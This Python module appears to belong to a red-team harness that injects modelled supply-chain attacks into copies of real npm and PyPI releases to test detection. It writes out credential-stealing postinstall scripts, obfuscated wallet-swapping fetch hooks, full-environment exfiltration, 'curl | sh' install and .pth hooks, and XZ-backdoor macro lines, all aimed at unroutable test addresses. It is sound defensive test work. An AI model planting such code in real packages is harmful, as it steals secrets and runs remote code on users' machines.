"""Modelled supply-chain attacks used to tamper copies of real releases.

Each attack reproduces the shape of a real incident closely enough to test detection, but every
payload is inert: network endpoints are TEST-NET-1 addresses (192.0.2.0/24, never routed) or
``.invalid`` domains, encoded payloads decode to a harmless print, and nothing reads real secrets.
"""

from __future__ import annotations

import base64
import json
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path

NPM, SDIST, WHEEL = "npm", "sdist", "wheel"


class NotApplicable(Exception):
    """The attack does not fit this package (wrong format, or the file it modifies is missing)."""


@dataclass(frozen=True)
class Attack:
    id: str
    title: str
    incident: str
    formats: tuple[str, ...]
    inject: Callable[[Path, str], list[str]]  # (package root, format) -> changed relative paths

    def fits(self, artifact: Path) -> bool:
        from .tamper import detect_format

        return detect_format(artifact) in self.formats


INERT_B64 = base64.b64encode(b"print('wtmt red-team payload: inert')").decode()
INERT_B64_JS = base64.b64encode(b"console.log('wtmt red-team payload: inert')").decode()
ATTACKER_WALLET = "0x" + "00" * 18 + "dEaD"


# --- helpers --------------------------------------------------------------------------------------

def _rel(root: Path, path: Path) -> str:
    return path.relative_to(root).as_posix()


def _skip(path: Path) -> bool:
    parts = {p.lower() for p in path.parts}
    return bool(parts & {"test", "tests", "__tests__", "node_modules", "example", "examples"}) or any(
        p.endswith((".dist-info", ".egg-info")) for p in path.parts)


def npm_entry(root: Path) -> Path:
    """The file Node runs on require(): package.json ``main``, else index.js, else the first .js file."""
    manifest = root / "package.json"
    main = None
    if manifest.is_file():
        try:
            main = json.loads(manifest.read_text()).get("main")
        except ValueError:
            main = None
    candidates = []
    if isinstance(main, str) and main:
        m = main.removeprefix("./")
        candidates += [m, f"{m}.js", f"{m}/index.js"]
    candidates.append("index.js")
    for c in candidates:
        if (root / c).is_file():
            return root / c
    found = sorted(p for p in root.rglob("*.js") if not _skip(p.relative_to(root)))
    if not found:
        raise NotApplicable("no JavaScript entry point to modify")
    return found[0]


def python_init(root: Path) -> Path:
    """The top-level package's __init__.py (runs on import)."""
    inits = [p for p in root.rglob("__init__.py") if not _skip(p.relative_to(root))]
    if not inits:
        raise NotApplicable("no Python package __init__.py to modify")
    return min(inits, key=lambda p: (len(p.relative_to(root).parts), str(p)))


def _append(path: Path, code: str) -> None:
    text = path.read_text(encoding="utf-8", errors="surrogateescape") if path.exists() else ""
    if text and not text.endswith("\n"):
        text += "\n"
    path.write_text(text + code, encoding="utf-8", errors="surrogateescape")


def _edit_manifest(root: Path, change: Callable[[dict], None]) -> list[str]:
    manifest = root / "package.json"
    if not manifest.is_file():
        raise NotApplicable("no package.json")
    doc = json.loads(manifest.read_text())
    change(doc)
    manifest.write_text(json.dumps(doc, indent=2) + "\n")
    return ["package.json"]


# --- npm attacks ----------------------------------------------------------------------------------

def _postinstall_dropper(root: Path, fmt: str) -> list[str]:
    changed = _edit_manifest(root, lambda d: d.setdefault("scripts", {}).update(postinstall="node scripts/setup.js"))
    script = root / "scripts" / "setup.js"
    script.parent.mkdir(parents=True, exist_ok=True)
    script.write_text(
        "// Runs automatically on `npm install`.\n"
        "const https = require('https');\n"
        "const loot = JSON.stringify({ npm: process.env.NPM_TOKEN, gh: process.env.GITHUB_TOKEN,"
        " host: require('os').hostname() });\n"
        "const req = https.request('https://192.0.2.1/collect', { method: 'POST' });\n"
        "req.on('error', () => {});\nreq.end(loot);\n"
    )
    return changed + ["scripts/setup.js"]


def _wallet_hook(root: Path, fmt: str) -> list[str]:
    entry = npm_entry(root)
    _append(entry,
            "var _0x4f2a=['ethereum','request','fetch'];(function(_0x1b7c,_0x4f2a1){})(_0x4f2a,0x1a3);\n"
            "if(typeof window!=='undefined'){const _0x9e1d=window.fetch;window.fetch=async function(..._0x3a){"
            "const _0x5c=await _0x9e1d(..._0x3a);return _0x5c.text().then(_0x7d=>new Response(_0x7d.replace("
            f"/0x[a-fA-F0-9]{{40}}/g,'{ATTACKER_WALLET}')))}};}}\n")
    return [_rel(root, entry)]


def _injected_dependency(root: Path, fmt: str) -> list[str]:
    return _edit_manifest(root, lambda d: d.setdefault("dependencies", {}).update({"plain-crypto-js": "^4.2.1"}))


def _encrypted_loader(root: Path, fmt: str) -> list[str]:
    entry = npm_entry(root)
    _append(entry,
            "!function(){try{var r=require,t=process;function e(x){return Buffer.from(x,'hex').toString()}\n"
            "var d=r('crypto').createDecipher('aes256',t.env.npm_package_description||'');"
            "var u=d.update('00','hex','utf8')+d.final('utf8');\n"
            "var m=new module.constructor;m.paths=module.paths;m._compile(u,'');m.exports(r)}catch(_){}}();\n")
    return [_rel(root, entry)]


# --- attacks for several formats ------------------------------------------------------------------

def _env_exfil(root: Path, fmt: str) -> list[str]:
    if fmt == NPM:
        entry = npm_entry(root)
        _append(entry, "require('https').get('https://192.0.2.7/p?d=' + Buffer.from(JSON.stringify(process.env))"
                       ".toString('base64')).on('error', () => {});\n")
    else:
        entry = python_init(root)
        _append(entry, "import os as _o, urllib.request as _u\n"
                       "try:\n    _u.urlopen('https://192.0.2.7/p', data=repr(dict(_o.environ)).encode(), timeout=1)\n"
                       "except Exception:\n    pass\n")
    return [_rel(root, entry)]


def _exec_base64(root: Path, fmt: str) -> list[str]:
    entry = python_init(root)
    _append(entry, f"import base64 as _b;exec(_b.b64decode('{INERT_B64}'))\n")
    return [_rel(root, entry)]


# --- PyPI attacks ---------------------------------------------------------------------------------

def _setup_cmdclass(root: Path, fmt: str) -> list[str]:
    setup = root / "setup.py"
    if not setup.is_file() or "setup(" not in setup.read_text():
        raise NotApplicable("sdist has no setup.py to modify")
    text = setup.read_text()
    hook = ("import os as _os\nfrom setuptools.command.install import install as _install\n\n\n"
            "class _PostInstall(_install):\n    def run(self):\n"
            "        _os.system('curl -s https://192.0.2.1/x | sh')\n        _install.run(self)\n\n\n")
    text = hook + text.replace("setup(", "setup(cmdclass={'install': _PostInstall}, ", 1)
    setup.write_text(text)
    return ["setup.py"]


def _xz_m4(root: Path, fmt: str) -> list[str]:
    path = root / "m4" / "build-to-host.m4"
    path.parent.mkdir(parents=True, exist_ok=True)
    # Lines from the real CVE-2024-3094 build-to-host.m4 (the payload it extracts does not exist here).
    _append(path,
            "dnl build-to-host.m4 serial 30\n"
            "gl_am_configmake=`grep -aErls \"#{4}[[:alnum:]]{5}#{4}$\" $srcdir/ 2>/dev/null`\n"
            "gl_[$1]_prefix=`echo $gl_am_configmake | sed \"s/.*\\.//g\"`\n"
            "gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"'\n"
            "gl_[$1]_config='sed \\\"r\\n\\\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'\n")
    return ["m4/build-to-host.m4"]


def _pth_autorun(root: Path, fmt: str) -> list[str]:
    name = "zzz_wtmt_init.pth"
    (root / name).write_text("import os; os.system('curl -s https://192.0.2.1/x | sh')\n")
    return [name]


ATTACKS: dict[str, Attack] = {a.id: a for a in [
    Attack("postinstall-dropper", "New postinstall hook runs a script that steals registry/CI tokens",
           "ua-parser-js 2021, Shai-Hulud worm 2025", (NPM,), _postinstall_dropper),
    Attack("wallet-hook", "Obfuscated code hooks fetch() and swaps crypto wallet addresses",
           "debug/chalk account takeover, Sept 2025", (NPM,), _wallet_hook),
    Attack("injected-dependency", "A dependency the source never declared is added at publish time",
           "axios compromise (plain-crypto-js), 2026", (NPM,), _injected_dependency),
    Attack("encrypted-loader", "Encrypted payload compiled into a module at runtime",
           "event-stream / flatmap-stream, 2018", (NPM,), _encrypted_loader),
    Attack("env-exfil", "Entry file sends the whole environment to a remote host",
           "Typosquat credential stealers (npm and PyPI)", (NPM, SDIST, WHEEL), _env_exfil),
    Attack("exec-base64", "Package __init__ executes a base64-encoded payload on import",
           "W4SP stealer campaign on PyPI, 2022", (SDIST, WHEEL), _exec_base64),
    Attack("setup-cmdclass", "setup.py overrides the install command to download and run a script",
           "PyPI typosquats (colourama, ctx-style droppers)", (SDIST,), _setup_cmdclass),
    Attack("xz-m4", "Release-only autotools macro unpacks a hidden payload during the build",
           "XZ Utils backdoor, CVE-2024-3094", (SDIST,), _xz_m4),
    Attack("pth-autorun", ".pth file executes code every time Python starts",
           "PyPI .pth malware, 2023-2024", (WHEEL,), _pth_autorun),
]}
